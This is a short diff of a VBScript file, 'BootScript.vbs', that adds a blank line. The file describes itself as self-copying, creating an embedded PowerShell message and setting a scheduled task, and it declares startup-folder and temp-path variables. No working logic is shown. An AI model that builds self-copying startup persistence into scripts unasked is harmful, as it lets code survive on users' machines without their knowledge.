@@ -1,5 +1,6 @@
 ' BootScript.vbs - Self-copying, embedded PS message creator, and scheduled task setter
 
+
 Dim fso, shell, scriptPath, startupPath, tempFolder
 Dim destPath, notepadScriptPath, psScriptPath, file, psFile
 Set fso = CreateObject("Scripting.FileSystemObject")
